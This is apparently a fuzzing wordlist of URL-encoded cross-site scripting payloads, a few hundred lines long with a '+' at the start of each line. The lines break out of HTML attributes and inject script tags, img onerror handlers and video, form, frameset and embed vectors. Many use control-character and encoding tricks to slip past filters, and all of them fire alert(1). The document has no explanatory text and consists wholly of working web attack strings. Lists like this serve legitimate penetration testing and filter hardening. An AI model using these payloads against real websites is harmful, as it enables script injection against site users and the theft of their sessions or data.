+%22%60'%3E%3Cscript%3E/xE2/x80/xA8javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x8Ajavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE1/x9A/x80javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x0Cjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x2Bjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xF0/x90/x96/x9Ajavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E-javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x0Ajavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/xAFjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x7Ejavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x87javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x81/x9Fjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/xA9javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xC2/x85javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xEF/xBF/xAEjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x83javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x8Bjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xEF/xBF/xBEjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x80javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x21javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x82javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE2/x80/x86javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xE1/xA0/x8Ejavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x0Bjavascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/x20javascript:alert(1)%3C/script%3E  
+%22%60'%3E%3Cscript%3E/xC2/xA0javascript:alert(1)%3C/script%3E  
+%22/%3E%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+%22/%3E%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Bjavascript:alert(1)/x0Bsrc=xxx:x%20/%3E  
+%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x22javascript:alert(1)/x22src=xxx:x%20/%3E  
+%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x09javascript:alert(1)/x09src=xxx:x%20/%3E  
+%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x27javascript:alert(1)/x27src=xxx:x%20/%3E  
+%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Ajavascript:alert(1)/x0Asrc=xxx:x%20/%3E  
+%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Cjavascript:alert(1)/x0Csrc=xxx:x%20/%3E  
+%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x0Djavascript:alert(1)/x0Dsrc=xxx:x%20/%3E  
+%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x60javascript:alert(1)/x60src=xxx:x%20/%3E  
+%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+%22%3E%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+'%3E%3Cimg/onerror=/x20javascript:alert(1)/x20src=xxx:x%20/%3E  
+%3Cscript/x2F%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x2F%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x2F%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x20%3Ejavascript:alert(1)%3C/script%3E  
+%3Cscript/x0D%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x0D%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x0D%3Ejavascript:alert(1)%3C/script%3E  
+%3Cscript/x0A%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x0A%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x0A%3Ejavascript:alert(1)%3C/script%3E  
+%3Cscript/x0C%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x0C%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x0C%3Ejavascript:alert(1)%3C/script%3E  
+%3Cscript/x00%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x00%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x00%3Ejavascript:alert(1)%3C/script%3E  
+%3Cscript/x09%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript/x09%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript/x09%3Ejavascript:alert(1)%3C/script%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror/x0B=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror/x00=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror/x0C=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror/x0D=javascript:alert(1)%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror/x20=javascript:alert(1)%3E  
+%22%3E%3Cimg%20src=  
+'%3E%3Cimg%20src=  
+%3Cvideo%20poster=javascript:javascript:alert(1)//  
+%22%3E%3Cvideo%20poster=javascript:javascript:alert(1)//  
+'%3E%3Cvideo%20poster=javascript:javascript:alert(1)//  
+%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%3Cform%20id=test%20onforminput=javascript:alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=javascript:alert(1)%3EX  
+%22%3E%3Cform%20id=test%20onforminput=javascript:alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=javascript:alert(1)%3EX  
+'%3E%3Cform%20id=test%20onforminput=javascript:alert(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=javascript:alert(1)%3EX  
+%3Cvideo%3E%3Csource%20onerror=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22javascript:javascript:alert(1)%22%3E  
+%3Cvideo%20onerror=%22javascript:javascript:alert(1)%22%3E%3Csource%3E  
+%22%3E%3Cvideo%20onerror=%22javascript:javascript:alert(1)%22%3E%3Csource%3E  
+'%3E%3Cvideo%20onerror=%22javascript:javascript:alert(1)%22%3E%3Csource%3E  
+%3Cform%3E%3Cbutton%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+%22%3E%3Cform%3E%3Cbutton%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+'%3E%3Cform%3E%3Cbutton%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+%3Cbody%20oninput=javascript:alert(1)%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20oninput=javascript:alert(1)%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20oninput=javascript:alert(1)%3E%3Cinput%20autofocus%3E  
+%3Cmath%20href=%22javascript:javascript:alert(1)%22%3ECLICKME%3C/math%3E%20%20%3Cmath%3E%20%3Cmaction%20actiontype=%22statusline  
+%22%3E%3Cmath%20href=%22javascript:javascript:alert(1)%22%3ECLICKME%3C/math%3E%20%20%3Cmath%3E%20%3Cmaction%20actiontype=%22statusline  
+'%3E%3Cmath%20href=%22javascript:javascript:alert(1)%22%3ECLICKME%3C/math%3E%20%20%3Cmath%3E%20%3Cmaction%20actiontype=%22statusline  
+%3Cframeset%20onload=javascript:alert(1)%3E  
+%22%3E%3Cframeset%20onload=javascript:alert(1)%3E  
+'%3E%3Cframeset%20onload=javascript:alert(1)%3E  
+%3Ctable%20background=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3Ctable%20background=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3Ctable%20background=%22javascript:javascript:alert(1)%22%3E  
+%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%22%3E%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+'%3E%3C!--%3Cimg%20src=%22--%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=javascript:alert(1))//%22%3E  
+%22%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=javascript:alert(1))//%22%3E  
+'%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=javascript:alert(1))//%22%3E  
+%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%22%3E%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+'%3E%3C![%3E%3Cimg%20src=%22]%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%22%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+'%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//%22%3E  
+%3Cli%20style=list-style:url()%20onerror=javascript:alert(1)%3E%20%3Cdiv%20sty
+%22%3E%3Cli%20style=list-style:url()%20onerror=javascript:alert(1)%3E%20%3Cdiv%20sty
+'%3E%3Cli%20style=list-style:url()%20onerror=javascript:alert(1)%3E%20%3Cdiv%20sty
+%3Chead%3E%3Cbase%20href=%22javascript://%22%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,javascript:alert(1)//  
+%22%3E%3Chead%3E%3Cbase%20href=%22javascript://%22%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,javascript:alert(1)//  
+'%3E%3Chead%3E%3Cbase%20href=%22javascript://%22%3E%3C/head%3E%3Cbody%3E%3Ca%20href=%22/.%20/,javascript:alert(1)//  
+%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ejavascript:alert(1)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ejavascript:alert(1)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Ejavascript:alert(1)%3C/SCRIPT%3E  
+%3Cb%20%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E0  
+%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=javascript:alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+%22%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=javascript:alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+'%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=javascript:alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//'%3E  
+%22%3E%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//'%3E  
+'%3E%3Cx%20'=%22foo%22%3E%3Cx%20foo='%3E%3Cimg%20src=x%20onerror=javascript:alert(1)//'%3E  
+%3Cembed%20src=%22javascript:alert(1)%22%3E  
+%22%3E%3Cembed%20src=%22javascript:alert(1)%22%3E  
+'%3E%3Cembed%20src=%22javascript:alert(1)%22%3E  
+%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=javascript:alert(1)%3Ex  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=javascript:alert(1)%3Ex  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=javascript:alert(1)%3Ex  
+%3C?%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3C?%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+'%3E%3C?%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%3C!%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3C!%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+'%3E%3C!%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%3C/%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3C/%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+'%3E%3C/%20foo=%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%3C?%20foo=%22%3E%3Cx%20foo='?%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E'%3E%22%3E  
+%22%3E%3C?%20foo=%22%3E%3Cx%20foo='?%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E'%3E%22%3E  
+'%3E%3C?%20foo=%22%3E%3Cx%20foo='?%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E'%3E%22%3E  
+%3C!%20foo=%22[[[Inception]]%22%3E%3Cx%20foo=%22]foo%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3C!%20foo=%22[[[Inception]]%22%3E%3Cx%20foo=%22]foo%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+'%3E%3C!%20foo=%22[[[Inception]]%22%3E%3Cx%20foo=%22]foo%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E%22%3E  
+%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=javascript:alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+%22%3E%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=javascript:alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+'%3E%3Cdiv%20id=d%3E%3Cx%20xmlns=%22%3E%3Ciframe%20onload=javascript:alert(1)%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML=d.innerHTML%3C/script%3E  
+%3Cimg%20/x00src=x%20onerror=%22alert(1)%22%3E  
+%22%3E%3Cimg%20/x00src=x%20onerror=%22alert(1)%22%3E  
+'%3E%3Cimg%20/x00src=x%20onerror=%22alert(1)%22%3E  
+%3Cimg%20/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20/x12src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x12src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x12src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg/x47src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg/x10src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg/x10src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg/x10src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg/x13src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg/x13src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg/x13src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg/x32src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg/x32src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg/x32src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg/x11src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20/x34src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x34src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x34src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20/x39src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x39src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x39src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20/x00src=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20/x00src=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20/x00src=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x09=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x09=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x09=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x10=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x10=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x10=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x13=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x13=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x13=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x32=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x32=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x32=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x12=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x12=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x12=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x11=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x11=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x11=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src/x00=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x00=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x00=x%20onerror=%22javascript:alert(1)%22%3E  
